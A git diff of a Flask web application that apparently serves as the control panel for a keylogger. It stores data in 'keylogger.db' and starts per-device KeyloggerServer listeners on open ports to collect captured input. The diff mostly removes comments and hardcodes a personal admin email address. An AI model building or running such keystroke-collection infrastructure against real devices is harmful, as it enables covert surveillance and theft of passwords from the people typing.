@@ -49,10 +49,8 @@ BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 DATA_DIR = os.path.join(BASE_DIR, 'data')
 DB_PATH = os.path.join(DATA_DIR, 'keylogger.db')
 
-# Make sure the data directory exists
 os.makedirs(DATA_DIR, exist_ok=True)
 
-# Update your Flask SQLAlchemy configuration
 app.config['SQLALCHEMY_DATABASE_URI'] = f'sqlite:///{DB_PATH}'
 
 db.init_app(app)
@@ -62,7 +60,6 @@ login_manager.init_app(app)
 login_manager.login_view = 'login'
 login_manager.login_message = 'Please log in to access this page.'
 
-# Create tables
 with app.app_context():
     db.create_all()
 
@@ -88,7 +85,7 @@ def login():
         if user and user.check_password(password):
             login_user(user, remember=remember)
             next_page = request.args.get('next')
-            if next_page and next_page.startswith('/'):  # Ensure the next page is relative
+            if next_page and next_page.startswith('/'):  
                 return redirect(next_page)
             return redirect(url_for('macos'))
         
@@ -162,7 +159,6 @@ def contact():
             flash('Please fill all required fields')
             return render_template('contact.html')
         
-        # Send email to admin
         msg = MIMEMultipart()
         msg['From'] = os.getenv("EMAIL")
         msg['To'] = os.getenv("EMAIL")
@@ -177,7 +173,7 @@ def contact():
             connection.login(user=os.getenv('EMAIL'), password=os.getenv('PASSWORD'))
             connection.send_message(msg)
             
-            # Send copy to user only if checkbox is checked
+            
             if copy:
                 send_copy = MIMEMultipart()
                 send_copy['From'] = os.getenv("EMAIL")
@@ -192,7 +188,7 @@ def contact():
             
         except Exception as e:
             flash('An error occurred while sending the message. Please try again later.')
-            print(f"Error: {e}")  # For debugging
+            print(f"Error: {e}")  
             return render_template('contact.html')
             
         return redirect(url_for('contact'))
@@ -207,7 +203,7 @@ def subscribe_newsletter():
         flash('Please enter an email address')
         return redirect(request.referrer or url_for('home'))
     
-    # Check if email already exists
+    
     existing_subscriber = Newsletter.query.filter_by(email=email).first()
     if existing_subscriber:
         if existing_subscriber.is_active:
@@ -218,14 +214,14 @@ def subscribe_newsletter():
             flash('Subscription reactivated successfully!')
         return redirect(request.referrer or url_for('home'))
     
-    # Create new subscriber
+    
     subscriber = Newsletter(email=email)
     db.session.add(subscriber)
     
     try:
         db.session.commit()
         
-        # Send welcome email
+        
         msg = MIMEMultipart()
         msg['From'] = os.getenv("EMAIL")
         msg['To'] = email
@@ -261,8 +257,7 @@ class NewsletterForm(FlaskForm):
 @app.route('/admin/send-newsletter', methods=['GET', 'POST'])
 @login_required
 def send_newsletter():
-    # Check if user is admin
-    if not current_user.is_active or not current_user.email in ['admin@example.com']:  # Replace with your admin emails
+    if not current_user.is_active or not current_user.email in ['motiwolff@gmail.com']:
         abort(403)
     
     form = NewsletterForm()
@@ -404,14 +399,13 @@ if not app.debug:
     file_handler.setFormatter(formatter)
     app.logger.addHandler(file_handler)
 
-# Add these global variables near the top with other imports
-REMOTE_CONNECTIONS = {}  # Store remote connections {device_id: (host, port)}
-REMOTE_SERVERS = {}     # Store server instances {device_id: server_instance}
+REMOTE_CONNECTIONS = {}  
+REMOTE_SERVERS = {} 
 
 def start_remote_server(device_id):
     # Find an available port (starting from 12345)
     port = 12345
-    while port < 13345:  # Try up to port 13345
+    while port < 13345: 
         try:
             server = KeyloggerServer(host='0.0.0.0', port=port, db_path=DB_PATH)
             REMOTE_SERVERS[device_id] = server
@@ -425,7 +419,7 @@ def start_remote_server(device_id):
             app.logger.info(f"Started remote server for device {device_id} on port {port}")
             return port
             
-        except OSError:  # Port in use
+        except OSError:  
             port += 1
     
     raise Exception("No available ports found")
